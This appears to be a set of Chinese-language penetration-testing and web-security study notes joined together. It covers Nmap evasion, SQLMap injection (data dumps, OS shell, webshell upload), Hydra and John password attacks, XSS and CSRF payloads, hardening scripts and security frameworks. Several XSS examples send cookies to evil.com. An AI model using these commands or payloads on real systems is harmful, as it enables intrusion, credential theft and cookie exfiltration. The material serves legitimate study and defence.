nmap --script ssl-enum-ciphers -p 443 192.168.1.1

# DNS 区域传送
nmap --script dns-zone-transfer -p 53 ns1.example.com

# MySQL 空密码检测
nmap --script mysql-empty-password -p 3306 192.168.1.1

# 自定义脚本
nmap --script my-custom-script.nse 192.168.1.1
```

### 2.2 防火墙绕过

```bash
# 分片扫描
nmap -f 192.168.1.1

# 诱饵扫描
nmap -D RND:10 192.168.1.1     # 随机 10 个诱饵 IP
nmap -D decoy1,decoy2,ME 192.168.1.1

# 空闲扫描（Zombie Scan）
nmap -sI zombie_host 192.168.1.1

# 源端口欺骗
nmap --source-port 53 192.168.1.1   # 伪装 DNS 源端口

# 随机化扫描顺序
nmap --randomize-hosts 192.168.1.0/24

# 降低扫描速率
nmap -T0 --max-retries 1 192.168.1.1
```

## 3. Wireshark 深度分析

### 3.1 高级过滤

```
# 组合过滤
ip.src == 192.168.1.1 && tcp.flags.syn == 1 && tcp.flags.ack == 0
# 仅显示来自 192.168.1.1 的 SYN 包

# 搜索数据内容
tcp contains "password"
http contains "admin"
usb.src contains "00:1a"

# 基于长度的异常检测
frame.len > 1500                    # 超大帧
tcp.len == 0 && tcp.flags.syn == 0  # 纯 ACK 风暴

# DNS 隧道检测
dns.qry.name.len > 30               # 异常长的域名查询
dns.qry.name matches "[a-z0-9]{20,}"  # 随机子域名
```

### 3.2 协议分析技巧

```
HTTP 分析:
1. 过滤: http.request
2. 统计 → HTTP → 请求 → 查看请求分布
3. 右键 → 跟随 → HTTP 流 → 查看完整会话

TLS 分析:
1. 过滤: tls.handshake.type == 1  (ClientHello)
2. 查看支持的密码套件
3. 检查证书链和有效期

DNS 分析:
1. 过滤: dns.qry.name
2. 统计 → DNS → 查询类型分布
3. 检测 DNS 隧道: 异常 TXT 记录、超长子域名
```

### 3.3 tshark 命令行分析

```bash
# 基本抓包
tshark -i eth0 -w capture.pcap

# 读取并过滤
tshark -r capture.pcap -Y "http.request" \
  -T fields -e ip.src -e http.request.method -e http.host

# 统计 HTTP 状态码
tshark -r capture.pcap -Y "http.response" \
  -T fields -e http.response.code | sort | uniq -c | sort -rn

# 提取 DNS 查询
tshark -r capture.pcap -Y "dns.qry.name" \
  -T fields -e dns.qry.name | sort -u

# 导出 HTTP 对象
tshark -r capture.pcap --export-objects http,output_dir/

# TCP 流重组
tshark -r capture.pcap -z "follow,tcp,ascii,0"
```

## 4. Burp Suite 进阶

### 4.1 自动化扫描配置

```
1. 项目选项 → 连接 → 设置上游代理
2. 扫描器 → 配置扫描范围和排除项
3. 扫描器 → 活动扫描 → 选择审计项:
   - SQL 注入
   - XSS
   - 路径遍历
   - SSRF
   - 命令注入
4. 设置扫描速度: 节流避免触发 WAF
```

### 4.2 自定义插件（BApp Store）

| 插件            | 功能                 |
| :-------------- | :------------------- |
| Logger++        | 增强日志记录和搜索   |
| Autorize        | 自动化权限测试       |
| JSON Beautifier | JSON 格式化          |
| Hackvertor      | 编码/解码/加密标签   |
| Turbo Intruder  | 高性能 Intruder 替代 |
| Param Miner     | 自动发现隐藏参数     |

### 4.3 宏与会话管理

```
1. 项目选项 → 会话 → 添加宏
2. 录制登录流程: 访问登录页 → 提交凭证 → 获取会话
3. 设置宏触发条件: 检测到 302/401 时自动执行
4. 扫描器使用宏维持会话有效性
```

## 5. SQLMap 自动化注入

### 5.1 基本用法

```bash
# 检测 GET 参数注入
sqlmap -u "http://target.com/page?id=1" --batch

# 检测 POST 参数注入
sqlmap -u "http://target.com/login" \
  --data="username=admin&password=test" --batch

# 使用 Cookie 认证
sqlmap -u "http://target.com/page?id=1" \
  --cookie="session=abc123"

# 从 Burp 请求文件导入
sqlmap -r request.txt --batch

# 指定参数注入
sqlmap -u "http://target.com/page?id=1&cat=2" -p id
```

### 5.2 数据提取

```bash
# 枚举数据库
sqlmap -u "http://target.com/page?id=1" --dbs

# 枚举表
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# 枚举列
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# 提取数据
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C username,password --dump

# 提取所有数据
sqlmap -u "http://target.com/page?id=1" -D dbname --dump-all
```

### 5.3 高级技巧

```bash
# 绕过 WAF
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,between

# 指定注入技术
sqlmap -u "http://target.com/page?id=1" --technique=BEUSTQ
# B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline

# OS Shell（条件苛刻）
sqlmap -u "http://target.com/page?id=1" --os-shell

# 读取文件（MySQL FILE 权限）
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# 写入 WebShell
sqlmap -u "http://target.com/page?id=1" \
  --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

## 6. Hydra 暴力破解

### 6.1 在线服务爆破

```bash
# SSH 爆破
hydra -l root -P /usr/share/wordlists/rockyou.txt \
  ssh://192.168.1.1 -t 4 -W 3

# FTP 爆破
hydra -l admin -P passwords.txt ftp://192.168.1.1

# HTTP POST 表单爆破
hydra -l admin -P passwords.txt 192.168.1.1 http-post-form \
  "/login:username=^USER^&password=^PASS^:Login failed"

# MySQL 爆破
hydra -l root -P passwords.txt mysql://192.168.1.1

# RDP 爆破
hydra -l administrator -P passwords.txt rdp://192.168.1.1

# 多协议批量爆破
hydra -L users.txt -P passwords.txt -M targets.txt ssh
```

### 6.2 参数优化

```bash
# 线程数（注意目标限速）
-t 16              # 16 并发线程

# 连接超时
-W 3               # 等待 3 秒

# 端口指定
-s 2222            # 非标准端口

# 退出条件
-f                 # 找到一个有效密码即停止
-e nsr             # n=null密码, s=same as login, r=reverse login

# 使用代理
-o results.txt     # 输出结果到文件
```

## 7. John the Ripper 密码破解

### 7.1 基本用法

```bash
# 破解 Linux 密码
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt

# 查看破解结果
john --show combined.txt

# 破解 Windows SAM
samdump2 SYSTEM SAM > hashes.txt
john --format=NT hashes.txt

# 破解 ZIP 密码
zip2john protected.zip > zip_hash.txt
john zip_hash.txt

# 破解 RAR 密码
rar2john protected.rar > rar_hash.txt
john rar_hash.txt

# 破解 SSH 密钥
ssh2john id_rsa > ssh_hash.txt
john ssh_hash.txt
```

### 7.2 模式与规则

```bash
# 字典模式
john --wordlist=dict.txt hash.txt

# 规则模式（基于字典变体）
john --wordlist=dict.txt --rules hash.txt
# 自动应用: 大小写变换、数字追加、l33t 替换等

# 增量模式（暴力破解）
john --incremental hash.txt
john --incremental=Lower hash.txt       # 仅小写
john --incremental=Digits hash.txt      # 仅数字

# 自定义规则（john.conf）
[List.Rules:Custom]
$[0-9]$[0-9]     # 追加两位数字
^[_!@#]          # 前缀特殊字符
c                 # 首字母大写

john --wordlist=dict.txt --rules=Custom hash.txt
```

## 8. Kali Linux 工具集

### 8.1 常用工具分类

| 分类     | 工具                         | 用途             |
| :------- | :--------------------------- | :--------------- |
| 信息收集 | Nmap、Maltego、Recon-ng      | 侦察与枚举       |
| 漏洞分析 | Nikto、OpenVAS、Nessus       | 漏洞扫描         |
| Web 攻击 | SQLMap、Burp Suite、WPScan   | Web 渗透         |
| 密码攻击 | Hydra、John、Hashcat         | 密码破解         |
| 无线攻击 | Aircrack-ng、Wifite          | WiFi 渗透        |
| 社会工程 | SET、Phishing Frenzy         | 钓鱼攻击         |
| 后渗透   | Metasploit、Empire、Covenant | 持久化与横向移动 |
| 取证     | Volatility、Autopsy          | 数字取证         |

### 8.2 Kali 基础配置

```bash
# 更新系统
apt update && apt full-upgrade -y

# 安装常用工具
apt install -y nmap sqlmap hydra john nikto dirb gobuster

# 配置代理（如需）
export http_proxy=http://127.0.0.1:8080
export https_proxy=http://127.0.0.1:8080

# 网络配置
ip addr show
ip route show

# 服务管理
systemctl start postgresql     # Metasploit 数据库
systemctl start apache2        # Web 服务
```

## 9. 安全加固脚本编写

### 9.1 Linux 一键加固脚本

```bash
#!/bin/bash
# Linux 安全加固脚本
# 仅用于授权环境

echo "[1/8] 配置账户策略..."
# 密码复杂度
apt install -y libpam-pwquality
cat > /etc/security/pwquality.conf << 'EOF'
minlen = 12
minclass = 3
dcredit = -1
ucredit = -1
lcredit = -1
ocredit = -1
EOF

# 密码过期
chage -M 90 -m 7 -W 14 root

echo "[2/8] 配置 SSH 安全..."
cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
cat > /etc/ssh/sshd_config.d/hardening.conf << 'EOF'
Port 2222
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 30
ClientAliveInterval 300
ClientAliveCountMax 2
AllowUsers admin
EOF

echo "[3/8] 配置防火墙..."
ufw default deny incoming
ufw default allow outgoing
ufw allow 2222/tcp
ufw allow 80/tcp
ufw allow 443/tcp
ufw --force enable

echo "[4/8] 禁用危险服务..."
systemctl disable --now telnet.socket 2>/dev/null
systemctl disable --now rsh.socket 2>/dev/null
systemctl disable --now avahi-daemon 2>/dev/null
systemctl disable --now cups 2>/dev/null

echo "[5/8] 配置内核安全参数..."
cat >> /etc/sysctl.conf << 'EOF'
net.ipv4.tcp_syncookies = 1
net.ipv4.conf.all.rp_filter = 1
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.icmp_echo_ignore_broadcasts = 1
kernel.exec-shield = 1
fs.suid_dumpable = 0
EOF
sysctl -p

echo "[6/8] 配置审计..."
apt install -y auditd
cat > /etc/audit/rules.d/hardening.rules << 'EOF'
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/ssh/sshd_config -p wa -k sshd
-a always,exit -F arch=b64 -S chmod,chown -F auid>=1000 -k perm_mod
-a always,exit -F arch=b64 -S execve -F auid>=1000 -k exec
EOF
augenrules --load

echo "[7/8] 配置日志..."
sed -i 's/^#SystemMaxUse=/SystemMaxUse=500M/' /etc/systemd/journald.conf
systemctl restart systemd-journald

echo "[8/8] 文件权限加固..."
chmod 700 /root
chmod 600 /etc/shadow
chmod 644 /etc/passwd

echo "安全加固完成！请检查并重启系统。"
```

### 9.2 Windows 安全加固脚本

```powershell
# Windows 安全加固脚本
# 需要管理员权限运行

Write-Host "[1/6] 配置账户策略..."
net accounts /maxpwage:90 /minpwage:1 /minpwlen:12 /uniquepw:5
net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30

Write-Host "[2/6] 配置防火墙..."
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
# 禁用规则
Disable-NetFirewallRule -DisplayGroup "远程卷管理"
Disable-NetFirewallRule -DisplayGroup "远程事件日志管理"

Write-Host "[3/6] 禁用危险服务..."
@("Telnet","RemoteRegistry","SNMP","WinRM") | ForEach-Object {
    Set-Service -Name $_ -StartupType Disabled -ErrorAction SilentlyContinue
    Stop-Service -Name $_ -Force -ErrorAction SilentlyContinue
}

Write-Host "[4/6] 配置审计策略..."
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Object Access" /success:enable /failure:enable
auditpol /set /subcategory:"Privilege Use" /success:enable /failure:enable
auditpol /set /subcategory:"Account Management" /success:enable /failure:enable

Write-Host "[5/6] 安全配置..."
# 禁用 SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
# 禁用 LLMNR
New-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows NT\DNSClient" `
  -Name "EnableMulticast" -Value 0 -PropertyType DWord -Force
# 禁用 AutoRun
New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" `
  -Name "NoDriveTypeAutoRun" -Value 255 -PropertyType DWord -Force

Write-Host "[6/6] Windows Defender..."
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -MAPSReporting 2
Set-MpPreference -SubmitSamplesConsent 3
Update-MpSignature

Write-Host "安全加固完成！"
```



<!-- ============ 文档分隔线：033-cybersecurity/005-XSSAttack.md ============ -->



## 1. XSS 攻击原理

### 1.1 什么是 XSS

跨站脚本攻击（Cross-Site Scripting, XSS）是一种将恶意脚本注入到受信任网站中的攻击方式。攻击者利用 Web 应用对用户输入缺乏充分过滤/转义的漏洞，使恶意代码在其他用户的浏览器中执行。

### 1.2 攻击流程

```
1. 攻击者发现输入点 → 注入恶意脚本
2. 服务器未过滤 → 存储或反射恶意内容
3. 受害者访问页面 → 浏览器执行恶意脚本
4. 脚本窃取 Cookie/Session/敏感信息 → 发送到攻击者服务器
```

### 1.3 危害

| 危害类型    | 描述                                     |
| ----------- | ---------------------------------------- |
| Cookie 窃取 | 窃取用户 Session，实现会话劫持           |
| 键盘记录    | 记录用户输入的密码等敏感信息             |
| 钓鱼攻击    | 伪造登录表单骗取凭证                     |
| 网页篡改    | 修改页面内容，破坏品牌形象               |
| 蠕虫传播    | 自动发送含恶意代码的消息（如 Samy 蠕虫） |
| 挖矿劫持    | 在用户浏览器中运行加密货币挖矿脚本       |

## 2. XSS 分类

### 2.1 反射型 XSS（非持久型）

恶意脚本通过 URL 参数传递，服务器将其"反射"回响应页面。

**攻击示例**：

```
https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
```

**特点**：

- 一次性触发，需诱骗用户点击恶意链接
- 不存储在服务器端
- 常见于搜索、错误提示等页面

### 2.2 存储型 XSS（持久型）

恶意脚本被永久存储在服务器（数据库、文件等），每次访问都会执行。

**攻击示例**：

```html
<!-- 在评论区提交 -->
<div class="comment">
  <script>
    fetch('https://evil.com/steal?c=' + document.cookie);
  </script>
</div>
```

**特点**：

- 持久化存储，影响范围广
- 无需诱骗点击，用户正常浏览即可触发
- 危害最大，常见于评论、留言、用户资料

### 2.3 DOM 型 XSS

恶意脚本通过修改 DOM 环境触发，完全在客户端完成，不经过服务器。

**漏洞代码**：

```javascript
// 从 URL 提取内容直接写入 DOM
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = 'Hello, ' + name;
```

**攻击 URL**：

```
https://example.com/page?name=<img src=x onerror=alert(1)>
```

**特点**：

- 客户端漏洞，服务器日志无法记录
- WAF 难以检测
- 常见于 SPA 应用

## 3. XSS 绕过技术

### 3.1 基本绕过

| 过滤方式        | 绕过方法                                         |
| --------------- | ------------------------------------------------ |
| `<script>` 过滤 | `<img onerror>`、`<svg onload>`                  |
| 关键字大小写    | `<ScRiPt>`                                       |
| 空格/换行       | `<scr\nipt>`                                     |
| 编码绕过        | HTML 实体 `&#x3c;script&#x3e;`、Unicode `\u003c` |
| 双重编码        | `%253cscript%253e`                               |

### 3.2 高级绕过

```javascript
// 事件处理器
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>

// JavaScript 伪协议
<a href="javascript:alert(1)">click</a>

// SVG 标签
<svg><script>alert&#40;1&#41;</script></svg>

// 模板字面量
<script>alert`1`</script>
```

## 4. XSS 防御策略

### 4.1 输入过滤与输出转义

**HTML 转义**：

```javascript
function escapeHtml(str) {
  const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;' };
  return str.replace(/[&<>"']/g, (c) => map[c]);
}
```

**不同上下文的转义**：

| 上下文     | 转义方式               |
| ---------- | ---------------------- |
| HTML 内容  | `&lt;` `&gt;` `&amp;`  |
| HTML 属性  | `&quot;` `&#x27;`      |
| JavaScript | Unicode 编码 `\uXXXX`  |
| URL        | `encodeURIComponent()` |
| CSS        | CSS 转义 `\XXXXXX`     |

### 4.2 内容安全策略（CSP）

```http
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-ancestors 'none'
```

**CSP 关键指令**：

| 指令               | 作用               |
| ------------------ | ------------------ |
| `script-src`       | 控制脚本来源       |
| `style-src`        | 控制样式来源       |
| `img-src`          | 控制图片来源       |
| `default-src`      | 默认策略           |
| `nonce-`           | 基于随机数的白名单 |
| `'strict-dynamic'` | 信任动态加载的脚本 |

### 4.3 HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`：JavaScript 无法读取 Cookie
- `Secure`：仅 HTTPS 传输
- `SameSite`：防止跨站请求携带 Cookie

### 4.4 现代框架防护

| 框架    | 防护机制                                           |
| ------- | -------------------------------------------------- |
| React   | JSX 自动转义，`dangerouslySetInnerHTML` 需显式使用 |
| Vue     | 模板自动转义，`v-html` 需显式使用                  |
| Angular | 默认转义，`DomSanitizer` 处理信任内容              |

## 5. XSS 检测与测试

### 5.1 自动化工具

| 工具       | 类型       | 特点            |
| ---------- | ---------- | --------------- |
| OWASP ZAP  | 代理扫描   | 开源、功能全面  |
| Burp Suite | 代理扫描   | 专业版功能强大  |
| XSSer      | 专用工具   | 自动化 XSS 检测 |
| Arachni    | Web 扫描器 | 支持 DOM XSS    |

### 5.2 手动测试 Payload

```
// 基础探测
<script>alert('XSS')</script>
"><script>alert(1)</script>
'><script>alert(1)</script>

// 事件处理器
" onmouseover="alert(1)
' onfocus=alert(1) autofocus='

// 编码绕过
%3Cscript%3Ealert(1)%3C/script%3E
&#60;script&#62;alert(1)&#60;/script&#62;
```



<!-- ============ 文档分隔线：033-cybersecurity/006-SecurityModelFramework.md ============ -->



## 1. 安全基本模型

### 1.1 CIA 三元组

| 属性   | 定义                 | 对抗威胁   |
| ------ | -------------------- | ---------- |
| 机密性 | 信息不被未授权访问   | 窃听、泄露 |
| 完整性 | 信息不被未授权修改   | 篡改、伪造 |
| 可用性 | 信息可被授权用户访问 | DDoS、破坏 |

### 1.2 其他安全属性

- **真实性**：身份可验证
- **不可否认性**：行为不可抵赖
- **可追溯性**：行为可追踪
- **可控性**：信息流可控

### 1.3 Bell-LaPadula 模型

保密性模型，两条规则：

- **不上读**：低安全级别不能读高安全级别数据
- **不下写**：高安全级别不能写低安全级别数据

### 1.4 Biba 模型

完整性模型，两条规则：

- **不下读**：高完整性级别不能读低完整性级别数据
- **不上写**：低完整性级别不能写高完整性级别数据

## 2. 零信任架构

### 2.1 核心原则

- 永不信任，始终验证
- 最小权限
- 假设已被入侵
- 微分段
- 持续监控

### 2.2 NIST SP 800-207

三大组件：

| 组件     | 功能       |
| -------- | ---------- |
| PEP      | 策略执行点 |
| PDP      | 策略决策点 |
| 信任评估 | 持续评估   |

## 3. NIST 网络安全框架

### 3.1 五大功能

| 功能 | 说明     | 关键活动           |
| ---- | -------- | ------------------ |
| 识别 | 理解风险 | 资产管理、风险评估 |
| 保护 | 防护措施 | 访问控制、培训     |
| 检测 | 发现事件 | 监控、异常检测     |
| 响应 | 应对事件 | 事件管理、沟通     |
| 恢复 | 恢复服务 | 恢复计划、改进     |

## 4. ISO 27001

### 4.1 ISMS 体系

信息安全管理体系（ISMS）的核心：

- **Plan**：风险评估、制定策略
- **Do**：实施控制措施
- **Check**：监控和审核
- **Act**：持续改进

### 4.2 关键控制域

| 域             | 控制项数 |
| -------------- | -------- |
| 信息安全策略   | 2        |
| 信息安全组织   | 3        |
| 人力资源安全   | 3        |
| 资产管理       | 2        |
| 访问控制       | 2        |
| 密码学         | 1        |
| 物理安全       | 2        |
| 运营安全       | 7        |
| 通信安全       | 2        |
| 系统获取与维护 | 3        |
| 供应商关系     | 2        |
| 安全事件管理   | 2        |
| 业务连续性     | 2        |
| 合规性         | 2        |

## 5. 等保2.0

### 5.1 五个等级

| 等级 | 对象     | 侵害程度              |
| ---- | -------- | --------------------- |
| 一级 | 一般系统 | 合法权益              |
| 二级 | 一般系统 | 严重合法权益          |
| 三级 | 重要系统 | 社会秩序/公共利益     |
| 四级 | 特别重要 | 社会秩序/公共利益严重 |
| 五级 | 极端重要 | 国家安全              |

### 5.2 技术要求

- 安全物理环境
- 安全通信网络
- 安全区域边界
- 安全计算环境
- 安全管理中心

## 6. ATT&CK 框架

### 6.1 战术阶段

| 战术     | 说明         |
| -------- | ------------ |
| 侦察     | 收集目标信息 |
| 资源开发 | 准备攻击资源 |
| 初始访问 | 进入目标网络 |
| 执行     | 运行恶意代码 |
| 持久化   | 维持访问     |
| 权限提升 | 获取更高权限 |
| 防御规避 | 避免检测     |
| 凭证访问 | 窃取凭证     |
| 发现     | 探索网络     |
| 横向移动 | 扩展控制     |
| 收集     | 收集目标数据 |
| 命令控制 | 远程控制     |
| 数据渗出 | 窃取数据     |
| 影响     | 造成破坏     |



<!-- ============ 文档分隔线：033-cybersecurity/007-CSRFAttack.md ============ -->



## 1. CSRF 攻击原理

### 1.1 什么是 CSRF

跨站请求伪造（Cross-Site Request Forgery, CSRF）是一种利用用户已认证的身份，在用户不知情的情况下发起恶意请求的攻击方式。

### 1.2 攻击流程

```
1. 用户登录受信网站 A → 获得有效 Cookie/Session
2. 用户访问恶意网站 B → B 中包含对 A 的伪造请求
3. 浏览器自动携带 A 的 Cookie → A 服务器认为是合法请求
4. 攻击完成 → 用户账户执行了非预期操作
```

### 1.3 与 XSS 的区别

| 对比项           | CSRF             | XSS          |
| ---------------- | ---------------- | ------------ |
| 攻击目标         | 伪造用户请求     | 注入恶意脚本 |
| 是否需要脚本执行 | 不一定           | 必须         |
| 能否读取响应     | 不能（同源策略） | 能           |
| Cookie 可见性    | 不可见           | 可见         |
| 防御重点         | 请求来源验证     | 输入输出过滤 |

## 2. CSRF 攻击方式

### 2.1 GET 型 CSRF

最简单的攻击方式，通过图片标签或链接触发：

```html
<!-- 转账攻击 -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" />

<!-- 修改密码 -->
<img src="https://example.com/changepwd?newpwd=hacked123" />

<!-- 诱导点击 -->
<a href="https://example.com/delete?id=1">点击领取奖品</a>
```

### 2.2 POST 型 CSRF

通过自动提交的表单发起 POST 请求：

```html
<form id="csrf-form" action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="10000" />
</form>
<script>
  document.getElementById('csrf-form').submit();
</script>
```

### 2.3 AJAX 型 CSRF

利用 XMLHttpRequest 或 Fetch API：

```javascript
fetch('https://example.com/api/delete', {
  method: 'POST',
  credentials: 'include', // 携带 Cookie
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ id: 1 }),
});
```

> 注：当 `Content-Type` 为 `application/json` 时，浏览器会先发送 OPTIONS 预检请求（CORS），但某些服务器配置不当仍可能被利用。

### 2.4 JSON 型 CSRF

某些应用接受 `Content-Type: text/plain` 或表单格式的 JSON：

```html
<form action="https://api.example.com/action" method="POST" enctype="text/plain">
  <input type="hidden" name='{"action":"delete","id":' value='1,"ignore":"' />
</form>
```

## 3. CSRF 防御机制

### 3.1 CSRF Token

最主流的防御方式，服务器为每个会话/表单生成随机 Token：

**服务端生成**：

```python
# Flask 示例
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# 模板中自动注入
# <input type="hidden" name="csrf_token" value="{{ csrf_token() }}">
```

**验证流程**：

```
1. 服务器生成随机 Token → 存入 Session
2. 表单中嵌入隐藏字段携带 Token
3. 提交时服务器验证 Token 是否匹配
4. 攻击者无法获取 Token → 伪造请求失败
```

### 3.2 SameSite Cookie

```http
Set-Cookie: session=abc123; SameSite=Strict
```

| 值       | 效果                                 |
| -------- | ------------------------------------ |
| `Strict` | 完全禁止跨站请求携带 Cookie          |
| `Lax`    | GET 导航请求允许，POST/iframe 等禁止 |
| `None`   | 允许跨站携带（需配合 `Secure`）      |

**推荐**：大多数场景使用 `SameSite=Lax`，兼顾安全与用户体验。

### 3.3 Referer / Origin 检查

```python
# 验证请求来源
def verify_origin(request):
    origin = request.headers.get('Origin')
    referer = request.headers.get('Referer')
    allowed = ['https://example.com']

    if origin and origin not in allowed:
        return False
    if referer and not any(referer.startswith(a) for a in allowed):
        return False
    return True
```

**局限性**：

- 隐私设置可能移除 Referer
- Origin 在 GET 请求中可能为空
- 子域名可能被绕过

### 3.4 双重 Cookie 验证

```
1. 服务器将 Token 写入 Cookie
2. 前端 JavaScript 读取 Cookie → 添加到请求头/参数
3. 服务器验证 Cookie 中的 Token 与请求中的 Token 一致
```

攻击者无法读取跨域 Cookie，因此无法在请求中附加该 Token。

### 3.5 自定义请求头

```javascript
// 前端添加自定义头
fetch('/api/action', {
  method: 'POST',
  headers: { 'X-Requested-With': 'XMLHttpRequest' },
});
```

由于 CORS 限制，跨域请求无法添加自定义头，因此 CSRF 攻击无法携带此头。

## 4. RESTful API 的 CSRF 防护

| 策略                | 适用场景                              |
| ------------------- | ------------------------------------- |
| Bearer Token（JWT） | SPA + API 架构，Token 存 localStorage |
| CSRF Token          | 传统表单提交                          |
| SameSite Cookie     | 所有场景的基础防护                    |
| Origin 检查         | API 网关层验证                        |

## 5. CSRF 攻击检测

### 5.1 自动化工具

| 工具                | 特点               |
| ------------------- | ------------------ |
| Burp Suite CSRF POC | 一键生成 CSRF PoC  |
| OWASP ZAP           | 自动化 CSRF 检测   |
| CSRF Tester         | 专用 CSRF 测试工具 |

### 5.2 手动测试要点

- 检查关键操作（转账、改密、删除）是否验证 CSRF Token
- 验证 Token 是否可预测或固定
- 检查是否验证 Referer/Origin
- 测试 SameSite Cookie 配置
- 检查 JSON API 是否仅依赖 Cookie 认证



<!-- ============ 文档分隔线：033-cybersecurity/008-CryptographyApplication.md ============ -->


## 1. PKI 体系

### 1.1 组成

| 组件     | 功能           |
| -------- | -------------- |
| CA       | 证书颁发机构   |
| RA       | 注册机构       |
| 证书库   | 存储已颁发证书 |
| CRL/OCSP | 证书吊销查询   |
| 终端实体 | 证书使用者     |

### 1.2 证书链验证

```
根CA → 中间CA → 终端证书
  ↑ 验证签名    ↑ 验证签名
```

### 1.3 证书生命周期

```
申请 → 审核 → 签发 → 使用 → 续签/吊销
```

## 2. TLS 协议

### 2.1 TLS 1.3 握手

```
Client → Server: ClientHello + Key Share
Server → Client: ServerHello + Key Share + Certificate + Finished
Client → Server: Finished
```

1-RTT 完成，支持 0-RTT 恢复。

### 2.2 密码套件

```mermaid
flowchart TD
    T0["TLS_AES_256_GCM_SHA384"]
    T1["PRF/哈希"]
    T2["AEAD加密"]
    T3["密钥交换"]
    T4["协议版本"]
    T3 --> T4
```

## 3. 密钥管理

### 3.1 密钥生命周期

```
生成 → 分发 → 存储 → 使用 → 轮换 → 销毁
```

### 3.2 HSM

硬件安全模块（HSM）提供安全的密钥存储和密码运算。

### 3.3 KMS

密钥管理服务（KMS）提供云端密钥管理：

- 密钥自动轮换
- 访问审计
- 集成加密/解密API

## 4. 密码工程实践

### 4.1 安全随机数

```python
# 安全随机数生成
import secrets
key = secrets.token_bytes(32)  # 256位密钥
nonce = secrets.token_bytes(12)  # 96位nonce
```

### 4.2 AEAD 加密

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

key = AESGCM.generate_key(bit_length=256)
aesgcm = AESGCM(key)
nonce = os.urandom(12)
ct = aesgcm.encrypt(nonce, plaintext, associated_data)
pt = aesgcm.decrypt(nonce, ct, associated_data)
```

### 4.3 密码学禁忌

- 不要自己实现密码算法
- 不要使用ECB模式
- 不要重复使用nonce
- 不要使用MD5/SHA1
- 不要硬编码密钥
## Base64 编码解码

**基本写法：Base64 编码**
`echo -n "<字符串>" | base64`
```bash
# 编码字符串为 Base64
echo -n "hello world" | base64
```

**基本写法：Base64 解码**
`echo "<Base64>" | base64 -d`
```bash
# 解码 Base64 字符串
echo "aGVsbG8gd29ybGQ=" | base64 -d
```

**基本写法：编码文件**
`base64 <文件>`
```bash
# 编码文件内容为 Base64
base64 image.png > image.b64
```

**基本写法：解码到文件**
`base64 -d <文件> > <输出>`
```bash
# 解码 Base64 文件
base64 -d image.b64 > image.png
```

**基本写法：Python Base64**
`python3 -c "import base64; print(base64.b64encode(b'<字符串>').decode())"`
```bash
# Python 编码 Base64
python3 -c "import base64; print(base64.b64encode(b'hello').decode())"
```

**基本写法：URL 安全 Base64**
`python3 -c "import base64; print(base64.urlsafe_b64encode(b'<字符串>').decode())"`
```bash
# URL 安全的 Base64 编码
python3 -c "import base64; print(base64.urlsafe_b64encode(b'hello?world').decode())"
```

---

## 十六进制编码

**基本写法：字符串转十六进制**
`echo -n "<字符串>" | xxd -p`
```bash
# 字符串转十六进制
echo -n "hello" | xxd -p
```

**基本写法：十六进制转字符串**
`echo "<十六进制>" | xxd -r -p`
```bash
# 十六进制转字符串
echo "68656c6c6f" | xxd -r -p
```

**基本写法：文件转十六进制**
`xxd -p <文件>`
```bash
# 文件转十六进制表示
xxd -p file.bin > file.hex
```

**基本写法：十六进制转文件**
`xxd -r -p <文件> > <输出>`
```bash
# 十六进制转回文件
xxd -r -p file.hex > file.bin
```

**基本写法：Python 十六进制编码**
`python3 -c "print('<字符串>'.encode().hex())"`
```bash
# Python 字符串转十六进制
python3 -c "print('hello'.encode().hex())"
```

**基本写法：Python 十六进制解码**
`python3 -c "print(bytes.fromhex('<十六进制>').decode())"`
```bash
# Python 十六进制转字符串
python3 -c "print(bytes.fromhex('68656c6c6f').decode())"
```

---

## URL 编码解码

**基本写法：URL 编码（Python）**
`python3 -c "import urllib.parse; print(urllib.parse.quote('<字符串>'))"`
```bash
# URL 编码字符串
python3 -c "import urllib.parse; print(urllib.parse.quote('hello world & test'))"
```

**基本写法：URL 解码（Python）**
`python3 -c "import urllib.parse; print(urllib.parse.unquote('<编码>'))"`
```bash
# URL 解码字符串
python3 -c "import urllib.parse; print(urllib.parse.unquote('hello%20world%20%26%20test'))"
```

**基本写法：curl URL 编码**
`curl --data-urlencode "<数据>" <URL>`
```bash
# curl 自动编码 POST 数据
curl -G --data-urlencode "q=hello world & test" https://example.com/search
```

**基本写法：JavaScript URL 编码**
`node -e "console.log(encodeURIComponent('<字符串>'))"`
```bash
# JavaScript URL 编码
node -e "console.log(encodeURIComponent('hello world & test'))"
